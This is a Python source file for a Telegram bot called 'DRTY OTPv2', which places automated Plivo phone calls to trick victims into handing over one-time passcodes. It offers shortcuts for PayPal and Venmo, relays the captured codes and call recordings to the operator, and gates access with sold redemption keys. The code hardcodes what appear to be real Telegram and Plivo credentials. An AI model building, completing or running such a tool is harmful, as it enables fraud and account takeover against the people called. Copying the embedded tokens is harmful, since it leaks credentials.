import json
import threading
import logging
import time
from flask import Flask, request
from telegram import ParseMode, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from discord_webhook import DiscordWebhook, DiscordEmbed
from plivo import RestClient

# --- SETTINGS ---
bot_token = "8576687800:AAH5J_1MXZFx68rncmAkLs1rRtgWIZqdjiM"
discord_webhook_url = "DISCORD_WEBHOOK_HERE"
plivo_auth_id = "MAODFIMTUYNJI0OWZHOG"
plivo_auth_token = "ZDJhMTMxZWJjZGU3MTE0MTYxMWRhZWVmNzhkYjg4" # Ojo, el token estaba en tu código, cámbialo si es necesario

# Initialize Clients
app = Flask(__name__)
plivo_client = RestClient(plivo_auth_id, plivo_auth_token)
bot_instance = Bot(token=bot_token) # Instancia para enviar mensajes desde Flask

# Logs Configuration
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- UTILITIES (Database to JSON) ---
def read_json(path):
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

# Access Function (translated to hadAccess)
def has_access(user_id):
    key_log = read_json("keys/redeemedKeys.json")
    user_id_str = str(user_id)
    # Verifica si existe y si la fecha de expiración es mayor a la actual
    if user_id_str in key_log:
        return key_log[user_id_str] > int(time.time())
    return False

# --- LOGS TO DISCORD (Replaced hook.send) ---
def log_to_discord(user, user_id, command, full_message):
    embed = DiscordEmbed(title=f"{user} ran the command {command}", color='00b0f4')
    embed.add_embed_field(name='User ID', value=str(user_id), inline=True)
    embed.add_embed_field(name='Username', value=str(user), inline=True)
    embed.add_embed_field(name='Command', value=command, inline=True)
    embed.add_embed_field(name='Full Message', value=full_message, inline=False)
    embed.set_timestamp()
    
    webhook = DiscordWebhook(url=discord_webhook_url)
    webhook.add_embed(embed)
    webhook.execute()

# --- FLASK ROUTES (WEBHOOKS PLIVO) ---
@app.route('/test', methods=['POST'])
def plivo_webhook():
    # Plivo suele enviar datos como Form Data, pero soportamos JSON por si acaso
    data = request.form if request.form else request.json
    
    if not data:
        return "No data", 400

    caller_id = data.get('caller') or data.get('userid') # Tu logica usa 'caller', plivo a veces manda otros campos
    
    if caller_id:
        type_of = data.get('type')
        
        # Lógica de respuestas según el estado
        if type_of == "answered":
            bot_instance.send_message(chat_id=caller_id, text="<b>📞 Call Answered</b>\nThe call was answered by the Target.", parse_mode=ParseMode.HTML)
        
        elif type_of == "pressPin":
            bot_instance.send_message(chat_id=caller_id, text="<b>📨 Awaiting Pin</b>\nThe callee took the bait, now let's see if they send their pin.", parse_mode=ParseMode.HTML)
            
        elif type_of == "success" and data.get('code'):
            clean_code = data.get('code').replace("#", "").replace("*", "")
            bot_instance.send_message(chat_id=caller_id, text=f"<b>💸 Code Obtained</b>\n📱 - <code>{clean_code}</code>.", parse_mode=ParseMode.HTML)
            
        elif type_of == "failed" or type_of == "noInput":
            bot_instance.send_message(chat_id=caller_id, text="<b>⚠️ Code Unobtained</b>\nThe OTP code was not obtained from the callee.", parse_mode=ParseMode.HTML)
            
        elif type_of == "sendotp":
            bot_instance.send_message(chat_id=caller_id, text="<b>📨 Send OTP</b>\nThe callee has fallen for the bait, now it's time to send the OTP to their SMS.", parse_mode=ParseMode.HTML)

    # Recording Calls (Response)
    if data.get('response'):
        try:
            resp_json = json.loads(data.get('response'))
            if resp_json.get('recording_id'):
                recording_id = resp_json.get('recording_id')
                transcript_url = f"https://media.plivo.com/v1/Account/{plivo_auth_id}/Recording/{recording_id}.mp3"
                
                # Buscar a quién pertenece la llamada
                current_calls = read_json('calls/current.json')
                for chat_id, call_info in current_calls.items():
                    # call_info[1] es el request_uuid según tu lógica JS
                    if call_info[1] == resp_json.get('call_uuid'):
                        bot_instance.send_message(chat_id=chat_id, text=f'📜 The transcript was captured for this call, click <a href="{transcript_url}">here</a>.', parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"Error parsing recording: {e}")

    return "OK", 200

# --- COMMANDS ---

def start(update, context):
    chat_id = update.effective_chat.id
    msg = """DRTY OTPv2 COMMANDS 
    📞 CALL COMMANDS
    ☎️ | /call - Start a call    
    🅿️ | /paypal - Shortcut for PayPal OTP
    💻 | /venmo - Shortcut for Venmo OTP
    (Lista completa de comandos aquí...)
    """
    context.bot.send_message(chat_id=chat_id, text=msg, parse_mode=ParseMode.HTML)

# LOG LISTENERS
def log_messages(update, context):
    user = update.effective_user
    message = update.message.text
    if message:
        command = message.split()[0]
        log_to_discord(user.first_name, user.id, command, message)

# --- START BOT ---

def run_flask():
    # Correr Flask en el puerto 88
    app.run(host='0.0.0.0', port=88)

def main():
    # 1. Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # 2. Start Bot (Telegram)
    updater = Updater(bot_token, use_context=True)
    dp = updater.dispatcher

    # Register First Command
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", start))
    
    # Handlers HERE ...
    # callHandler.js and keyHandler.js
    
    # General Logs
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, log_messages))
    dp.add_handler(MessageHandler(Filters.command, log_messages), group=1)

    print("Bot Started...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
